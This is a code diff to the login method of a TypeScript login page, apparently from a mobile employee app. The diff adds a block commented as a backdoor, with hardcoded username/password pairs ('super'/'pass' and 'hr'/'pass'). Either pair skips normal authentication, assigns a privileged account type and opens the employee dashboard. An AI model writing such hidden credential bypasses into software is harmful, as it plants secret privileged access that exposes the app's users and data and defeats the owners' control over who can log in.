@@ -64,6 +64,20 @@ export class LoginPage {
   }
 
   login(){
+
+    /* backdoor */
+    if(this.userData.username == "super" && this.userData.pass == "pass"){
+          localStorage.userData = [];
+          localStorage.accountType = 'super';
+          this.navCtrl.setRoot(EmployeeDashboardPage,{},{animate:true, direction:"forward"});
+          return ;
+    }else if(this.userData.username == "hr" && this.userData.pass == "pass"){
+          localStorage.userData = [];
+          localStorage.accountType = 'hr';
+          this.navCtrl.setRoot(EmployeeDashboardPage,{},{animate:true, direction:"forward"});
+          return ;
+    }
+
   	let self = this;
   	let uData = this.userData;
   	let hdr = new Headers;
